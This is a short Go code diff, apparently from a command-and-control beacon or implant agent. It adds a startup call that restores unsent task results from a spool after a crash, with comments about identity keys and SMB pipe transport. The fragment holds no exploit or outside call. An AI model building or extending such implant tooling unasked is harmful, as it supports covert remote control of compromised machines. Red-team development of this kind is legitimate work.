@@ -390,6 +390,10 @@ func main() {
 	// registered marker so a restart continues the same session timeline.
 	agentRegKey = loadAgentRegKey()
 	loadBeaconState()
+	// Restore unsent task results collected before the last crash/restart.
+	// Must run after the UUID and identity key are available (loadBeaconState
+	// is not enough: the spool key is derived from identityPriv).
+	loadPendingResultsSpool()
 
 	// Debug note when running attached to an SMB parent pipe.
 	if getProtocol() == "smb" || getBeaconTransport() == "smb" {
